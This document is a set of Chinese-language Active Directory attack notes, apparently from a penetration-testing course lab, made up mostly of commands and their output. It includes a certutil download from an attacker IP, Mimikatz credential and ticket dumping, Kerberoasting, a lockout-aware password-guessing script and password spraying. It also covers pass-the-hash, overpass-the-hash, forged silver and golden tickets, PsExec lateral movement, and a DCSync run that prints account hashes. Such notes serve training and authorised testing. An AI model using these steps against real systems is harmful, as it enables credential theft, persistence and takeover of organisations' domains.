# 枚举

## 传统方法

本地用户
```
net user
```

域用户
```
net user /domain
```

查看域用户详细信息
```
net user jeff_admin /domain
```

查看域中所有组
```
net group /domain
```

## 现代方法

certutil -urlcache -split -f "http://192.168.119.181/search.ps1" search.ps1

## powerview

枚举某台计算机登录的用户
```
Get-NetLoggedon -ComputerName client251
```

枚举某台计算机的登录session
```
Get-NetSession -ComputerName dc01
```
获取SPN

```
Get-NetUser -spn |select userprincipalname,serviceprincipalname
```

# 活动目录身份验证

## mimikatz

提升权限，导出哈希
```
privilege::debug
sekurlsa::logonpasswords
```

显示存储在内存中的用户票证
```
sekurlsa::tickets
```

导出票据(会生成很多.kirbi文件)
```
sekurlsa::tickets /export
```

票据传递,将票据文件注入内存（PTT）
```
mimikatz "kerberos::ptt "[0;4ee98c]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi"
```

## SPN破解

查找所有SPN(powerview)
```
Get-NetUser -spn |select userprincipalname,serviceprincipalname
```

请求票据
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```

查看
```
klist
```

导出票据
```
kerberos::list /export
```

使用tgsrepcrack.py破解，也可以使用john或者hashcat
```
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

## 低速密码猜测

查看密码账号策略
```
PS C:\Users\Offsec.corp> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              0
Length of password history maintained:                None
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```
Lockout threshold=5,表示锁定之前的五次登录尝试限制。这意味着我们可以安全地尝试四次登录而不会触发锁定

一个小的powershell脚本进行密码猜测
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")
```

上面脚本如果成功则会创建对象，失败会抛出异常，超过规定次数账号会被锁定

使用自动化工具进行哈希喷洒
spray.sh
```
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
crackmapexec
```
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

# 横向移动

## 哈希传递（pass the hash）

注意：不适用于 Kerberos 身份验证，而仅适用于使用 NTLM 身份验证的服务器或服务

使用pth-winexe（不会新开shell，直接打开一个命令行）
```
kali@kali:~$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
此方法适用于 Active Directory 域帐户和内置的本地管理员帐户。自 2014 年安全更新以来，7此技术不能用于作为任​​何其他本地管理员帐户进行身份验证

## over pass hash（利用TGT）

overpass hash 技术的本质是将 NTLM 哈希转换为 Kerberos 票证，避免使用 NTLM 身份验证。一个简单的方法是再次使用 Mimikatz 的sekurlsa::pth 命令

作为第一个参数，我们指定/user:和 /domain:，分别将它们设置为jeff_admin和 corp.com。我们将使用 /ntlm:指定 NTLM 哈希，最后使用/run:指定要创建的进程（在本例中为 PowerShell）

```
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
user    : jeff_admin
domain  : corp.com
program : cmd.exe
impers. : no
NTLM    : e2b475c11da2a0748290d87aa966c327
  |  PID  4832
  |  TID  2268
  |  LSA Process is now R/W
  |  LUID 0 ; 1197687 (00000000:00124677)
  \_ msv1_0   - data copy @ 040E5614 : OK !
  \_ kerberos - data copy @ 040E5438
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace -> null
```

用klist列出缓存的 Kerberos 票证

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (0)
```

没有缓存 Kerberos 票证,通过使用net use对域控制器上的网络共享进行身份验证来生成 TGT

```
PS C:\Windows\system32> net use \\dc01
The command completed successfully.
```

再次klist查看
```
PS C:\Windows\system32> klist
#1> Client: jeff_admin @ CORP.COM
    Server: krbtgt/CORP.COM @ CORP.COM
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonica
    Start Time: 2/12/2018 13:59:40 (local)
    End Time:   2/12/2018 23:59:40 (local)
    Renew Time: 2/19/2018 13:59:40 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x1 -> PRIMARY
    Kdc Called: DC01.corp.com

#2> Client: jeff_admin @ CORP.COM
    Server: cifs/dc01 @ CORP.COM
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_c
    Start Time: 2/12/2018 13:59:40 (local)
    End Time:   2/12/2018 23:59:40 (local)
    Renew Time: 2/19/2018 13:59:40 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0
    Kdc Called: DC01.corp.com
```

输出表明net use命令成功。然后我们使用klist命令列出新请求的 Kerberos 票证，其中包括用于CIFS 服务的 TGT 和 TGS

运行./PsExec.exe以在\dc01机器上以 Jeff_Admin 身份远程启动 cmd.exe

```
PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7959:aaad:eec:3969%2
   IPv4 Address. . . . . . . . . . . : 192.168.1.110
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
...

C:\Windows\system32> whoami
corp\jeff_admin
```

## pass the ticket（票据传输，利用TGS）

### 制作银票
silver ticket 命令需要用户名 ( /user )、域名 ( /domain )、上面突出显示的域 SID ( /sid )、服务的完全限定主机名 ( /target )、服务类型 ( / service:HTTP )，以及 iis_service 服务帐户 ( /rc4 ) 的密码哈希。

最后，使用/ptt标志将生成的银票直接注入内存。

在运行此之前，我们将使用kerberos::purge刷新任何现有的 Kerberos 票证，并使用kerberos::list验证清除 
```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::list

mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
User      : offsec
Domain    : corp.com (CORP)
SID       : S-1-5-21-1602875587-2787523311-2599479668
User Id   : 500
Groups Id : \*513 512 520 518 519
ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt
Service   : HTTP
Target    : CorpWebServer.corp.com
Lifetime  : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
-> Ticket : \*\* Pass The Ticket \*\*

 \* PAC generated
 \* PAC signed
 \* EncTicketPart generated
 \* EncTicketPart encrypted
 \* KrbCred generated

Golden ticket for 'offsec @ corp.com' successfully submitted for current session

mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com
   Client Name       : offsec @ corp.com
   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
```

注意：要创建银票，我们使用密码哈希而不是明文密码。如果 kerberoast 会话向我们提供了明文密码，我们必须在使用它生成银票之前对其进行哈希处理。

现在我们已将这张票加载到内存中，我们可以与服务交互并根据我们放入银票中的组成员身份访问任何信息。根据服务的类型，也有可能获得代码执行

# 域持久性

## 金票

前提：需要krbtgt的NTML信息

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
User      : fakeuser
Domain    : corp.com (CORP)
SID       : S-1-5-21-1602875587-2787523311-2599479668
User Id   : 500
Groups Id : \*513 512 520 518 519
ServiceKey: 75b60230a2394a812000dbfad8415965 - rc4_hmac_nt
Lifetime  : 14/02/2018 15.08.48 ; 12/02/2028 15.08.48 ; 12/02/2028 15.08.48
-> Ticket : \*\* Pass The Ticket \*\*

 \* PAC generated
 \* PAC signed
 \* EncTicketPart generated
 \* EncTicketPart encrypted
 \* KrbCred generated

Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
```

将金票注入内存后，我们可以使用misc::cmd启动新的命令提示符，并再次尝试使用 PsExec 横向移动。

```
C:\Users\offsec.crop> psexec.exe \\dc01 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7959:aaad:eec:3969%2
   IPv4 Address. . . . . . . . . . . : 192.168.1.110
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
...

C:\Windows\system32> whoami
corp\fakeuser
```

请注意，通过创建我们自己的 TGT 然后使用 PsExec，我们正在通过利用 Kerberos 身份验证来执行越过哈希攻击。如果我们使用 PsExec 连接到域控制器的 IP 地址而不是主机名，我们将强制使用 NTLM 身份验证，并且访问仍将被阻止，如下面的清单所示

```
C:\Users\Offsec.corp> psexec.exe \\192.168.1.110 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.1.110:
Access is denied.
```

## DCsync

前提：需要使用有DCsync权限的用户操作

> NTDS.dit数据库文件的副本，1它是存储在硬盘驱动器上的所有 Active Directory 帐户的副本，类似于用于本地帐户的 SAM 数据库

```
mimikatz # lsadump::dcsync /user:Administrator
[DC] 'corp.com' will be the domain
[DC] 'DC01.corp.com' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

\*\* SAM ACCOUNT \*\*

SAM Username         : Administrator
User Principal Name  : Administrator@corp.com
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 05/02/2018 19.33.10
Object Security ID   : S-1-5-21-1602875587-2787523311-2599479668-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: e2b475c11da2a0748290d87aa966c327
  ntlm- 0: e2b475c11da2a0748290d87aa966c327
  lm  - 0: 913b84377b5cb6d210ca519826e7b5f5

Supplemental Credentials:
\* Primary:NTLM-Strong-NTOWF \*
  Random Value : f62e88f00dff79bc79f8bad31b3ffa7d

\* Primary:Kerberos-Newer-Keys \*
  Default Salt : CORP.COMAdministrator
  Default Iterations : 4096
  Credentials
  aes256_hmac (4096): 4c6300b908619dc7a0788da81ae5903c2c97c5160d0d9bed85cfd5af02dabf01
  aes128_hmac (4096): 85b66d5482fc19858dadd07f1d9b818a
  des_cbc_md5 (4096): 021c6df8bf07834a

\* Primary:Kerberos \*
  Default Salt : CORP.COMAdministrator
  Credentials
    des_cbc_md5       : 021c6df8bf07834a

\* Packages \*
  NTLM-Strong-NTOWF

\* Primary:WDigest \*
  01  4ec8821bb09675db670e66998d2161bf
  02  3c9be2ff39c36efd2f84b63aa656d09a
  03  2cf1734936287692601b7e36fc01e2d7
  04  4ec8821bb09675db670e66998d2161bf
  05  3c9be2ff39c36efd2f84b63aa656d09a
...
```


